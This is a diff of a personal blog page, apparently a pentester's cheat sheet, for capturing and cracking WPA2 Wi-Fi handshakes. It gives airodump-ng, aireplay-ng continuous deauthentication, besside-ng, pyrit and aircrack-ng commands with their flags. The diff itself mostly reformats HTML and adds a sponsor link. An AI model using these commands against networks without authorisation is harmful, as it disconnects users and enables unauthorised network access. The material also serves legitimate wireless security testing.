@@ -68,110 +68,83 @@
         
       </div>
 
+      <div id="sponsor">
+	
+	
+		<a href="https://m.do.co/c/174262b22632" target="_blank" rel="noopener">🚀 Get $100 in DigitalOcean credit to create a VPS in seconds 🚀</a>
+	
+	<br>
+	<span class="about"><a href="https://danthesalmon.com/sponsors">About these ads</a></span>
+</div>
+
       <article class="post-content">
-      
-
-<h1 id="prepare-wireless-card">Prepare Wireless Card</h1>
-
+      <h1 id="prepare-wireless-card">Prepare Wireless Card</h1>
 <ul>
 <li><strong>View Network Cards:</strong>
-
 <ul>
 <li><code>iwconfig</code></li>
-</ul></li>
+</ul>
+</li>
 <li><strong>Kill Wireless Processes:</strong>
-
 <ul>
 <li><code>airmon-ng check kill</code></li>
-</ul></li>
 </ul>
-
-<hr />
-
+</li>
+</ul>
+<hr>
 <h1 id="view-networks">View Networks</h1>
-
 <pre><code>airodump-ng wlan0
-</code></pre>
-
-<hr />
-
+</code></pre><hr>
 <h1 id="capture-traffic">Capture traffic</h1>
-
 <pre><code>airodump-ng --bssid 04:A1:51:9F:98:BB --wps --write ISSO-WPA2 --channel 6 wlan0
-</code></pre>
-
-<p>where:</p>
-
+</code></pre><p>where:</p>
 <pre>
 --bssid   - MAC of router
 --wps     - Output WPS information, may be able to try Reaver
 --write   - File name to write to. No extension
 --channel - Statically set a channel. Don't need to unless de-authing
-wlan0     - Wireless interface  
+wlan0     - Wireless interface	
 </pre>
-
-<hr />
-
-<h1 id="deauth-do-while-capturing">Deauth - Do while capturing</h1>
-
+<hr>
+<h1 id="deauth---do-while-capturing">Deauth - Do while capturing</h1>
 <pre><code>aireplay-ng --deauth 0 -a 04:A1:51:9F:11:11 -c E0:AC:CB:DA:1B:1B wlan0
-</code></pre>
-
-<p>where:
+</code></pre><p>where:</p>
 <pre>
 0           - Continuously send deauth packets
 -a          - BSSID of router (from airodump)
 -c          - STATION of client (From airodump. Not necessary, but preferred)
 wlan0       - Interface
-&ndash;deauth     - Which aireplay attack to launch
+--deauth     - Which aireplay attack to launch
 [0|64 ACKs] - How many acknowledgements from AP|client. More=better especially for AP count
-</pre></p>
-
-<hr />
-
-<h1 id="automating-de-auth-attack-handshake-grab">Automating de-auth attack/handshake grab</h1>
-
+</pre>
+<hr>
+<h1 id="automating-de-auth-attackhandshake-grab">Automating de-auth attack/handshake grab</h1>
 <pre><code>besside-ng -W -c 6 -b 00:00:11:22:33:44 wlan0
-</code></pre>
-
-<p>where:</p>
-
+</code></pre><p>where:</p>
 <pre>
 -W    - WPA networks only
 -c    - channel lock
 -b    - BSSID of AP
 wlan0 - interface
 </pre>
-
 <ul>
 <li>Sort of experimental, will probably get errors</li>
 <li>Usually grabs handshake in under 1 minutes, saves to wpa.cap and wep.cap</li>
 <li>Need to see at least (Know 1 clients), otherwise nothing to deauth</li>
 </ul>
-
-<hr />
-
+<hr>
 <h1 id="seperate-out-individual-caps-from-besside-ng-output">Seperate out individual caps from besside-ng output</h1>
-
 <pre><code>pyrit -r wpa.cap -o mytargetnetwork.cap -e mytarget strip
-</code></pre>
-
-<p>where:</p>
-
+</code></pre><p>where:</p>
 <pre>
 -r - Input file to look at created by besside-ng
 -o - Output file to create
 -e - ESSID of network to filter by (alternatively, -b with BSSID of network)
 </pre>
-
-<hr />
-
+<hr>
 <h1 id="convert-cap-with-handshake-to-hccap">Convert .cap with handshake to .hccap</h1>
-
 <pre><code>aircrack-ng -J network network.cap
-</code></pre>
-
-<ul>
+</code></pre><ul>
 <li>Aircrack already adds .hccap extension to file</li>
 </ul>
 
@@ -215,7 +188,7 @@ wlan0 - interface
 </nav>
 
           <small>
-            Copyright &#169; 2018<br>
+            Copyright &#169; 2019<br>
             Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
           </small>
         </div>
